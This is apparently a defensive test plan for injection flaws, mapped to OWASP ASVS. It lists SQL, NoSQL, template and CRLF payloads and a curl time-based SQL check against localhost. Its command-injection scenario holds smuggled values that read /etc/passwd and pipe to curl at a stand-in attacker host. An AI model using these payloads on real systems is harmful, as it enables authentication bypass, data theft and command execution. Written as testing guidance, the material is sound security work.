# Input Validation - Injection Tests (Generic)

**Module**: Input Validation  
**Scope**: SQL injection, NoSQL injection, command injection  
**Scenarios**: 5  
**Risk**: Critical  
**OWASP ASVS 5.0**: V1 Encoding and Sanitization, V2 Validation and Business Logic

---

## Background

Injection attacks commonly appear in:
- Search/filter/sort parameters (`q`, `filter`, `sort`)
- String-concatenated SQL/dynamic conditions
- Passing user input into shell, templates, or expression engines
- Cache key construction and protocol injection (for example CRLF)

---

## Scenario 1: SQL Injection (Auth Bypass / Data Extraction)

### Preconditions
- A login, search, or filtering endpoint exists

### Attack Objective
Verify authentication/search is not vulnerable to SQL injection.

### Attack Steps
1. Inject into username/search fields: `' OR '1'='1`, `admin'--`
2. Attempt UNION/boolean-based blind/time-based blind injection (for example `SLEEP(5)`)

### Expected Secure Behavior
- Parameterized queries are used; no SQL syntax errors
- Auth cannot be bypassed; responses do not leak SQL details

### Verification
```bash
BASE="${API_BASE_URL:-http://localhost:8080}"
TOKEN="${API_TOKEN:-}"

curl -i -H "Authorization: Bearer $TOKEN" \
  "$BASE/api/v1/items?search=test'+AND+SLEEP(5)--"
```

---

## Scenario 2: NoSQL Injection (If Applicable)

### Preconditions
- The project uses MongoDB/Elastic/custom DSL queries, etc.

### Attack Objective
Verify query filters do not allow operator injection (for example `$ne`, `$where`).

### Attack Steps
1. Inject into JSON body: `{"field":{"$ne":""}}`
2. Inject similar expressions into query string (if supported)

### Expected Secure Behavior
- Server-side schema validation rejects unexpected structures
- Arbitrary expressions/scripts cannot be executed

---

## Scenario 3: Command Injection (If Applicable)

### Preconditions
- File processing/export features or external program invocation exist

### Attack Objective
Verify user input cannot reach a shell.

### Attack Steps
1. Inject into filenames/args: `; cat /etc/passwd`, `| curl attacker/...`
2. Observe whether external commands execute or side effects occur

### Expected Secure Behavior
- Injected commands do not execute
- Input is strictly validated/escaped, or the implementation avoids shells entirely

---

## Scenario 4: Template / Expression Injection (If Applicable)

### Preconditions
- A template engine, expression language, or rules engine is used

### Attack Objective
Verify user input is not executed as a template/expression.

### Attack Steps
1. Inject template syntax (for example `{{7*7}}`, `${{...}}`)
2. Inject expressions (engine-dependent)

### Expected Secure Behavior
- Input is treated as plain text
- Expressions do not execute

---

## Scenario 5: Protocol / CRLF Injection (If Applicable)

### Preconditions
- The service writes user input into headers, logs, cache keys, or downstream protocols

### Attack Objective
Verify `\r\n` does not cause header splitting or log forging.

### Attack Steps
1. Inject `%0d%0a` into controllable fields
2. Check response headers and logs

### Expected Secure Behavior
- No additional header lines are created
- User input is escaped/structured in logs as a field value

